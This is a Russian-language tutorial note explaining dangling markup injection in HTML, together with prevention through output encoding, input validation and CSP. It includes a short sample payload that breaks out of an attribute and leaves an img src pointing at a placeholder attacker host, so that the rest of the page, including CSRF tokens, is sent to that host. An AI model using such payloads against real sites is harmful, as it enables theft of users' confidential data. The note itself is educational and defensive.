В этом разделе мы объясним, что такое инъекция висящей разметки(dangling markup), как работает типичный эксплоит и как предотвращать такие атаки
# Что такое инъекция висящей разметки 
Инъекция висящей разметки(`dangling markup injection`) это техника междоменного захвата данных в ситуациях когда полноценная XSS атака невозможна

Предположим, приложение небезопасно встраивает свои ответы данные, контролируемые атакующим:

```
<input type="text" name="input" value="CONTROLLABLE DATA HERE
```

допустим также, что приложение не фильтрует и не экранирует символы `<` или `"`. Атакующий может использовать следующую конструкцию чтобы, чтобы вырваться из заключенного в кавычки значения атрибута и из окружающего тега, вернувшись в HTML-контекст 

```
">
```

В такой ситуации атакующий естественно, попытается выполнить XSS. НО предположим, что обычная XSS атака невозможна из за фильтров ввода CSP или других препятствий. Тогда все еще может быть возможно провести атаку висящей разметкой с использованием такой полезной нагрузки:

```
"><img src='//attacker-website.com?
```

Данная полезная нагрузка создаст тег `img` и задает начало атрибута src, содержащего url на сервере атакующего. Обратите внимание, что полезная нагрузка е закрывает атрибут `src`, который остается висящим. Когда браузер парсит ответ он будет смотреть вперед, пока не встретит одинарную кавычку, чтобы завершить атрибут. Все до этого символа будет считаться частью URL. Следствие атаки в том, что атакующий может захватить часть ответа приложения, следующую за точкой инъекции, и эта часть может содержать конфиденциальные данные. В зависимости от функциональности приложения, это могут быть CSRF токены, email сообщения или финансовые данные

Любой атрибут, создающий внешний запрос, может быть использован для атаки "висящей разметкой".

Следующая лабораторная работа сложно поскольку все внешние запросы заблокированы. Решение этой лабораторной может потребовать взаимодействия с пользователем.
# Пример [[Content Secure Policy#^ec6be2]]

# Как предотвращать атаки "Висящей разметкой"
Мы можем предотвращать атаки висящей разметкой с помощью тех же общих мер, что и для предотвращения XSS: кодируйте данные при выводе и валидируйте ввод при получении.

Также вы можете смягчить некоторые атаки "висящей разметкой" с помощью CSP. Например можно предотвратить некоторые атаки применив политику, которая запрещает таким тегам как `img`, загружать внешние ресурсы.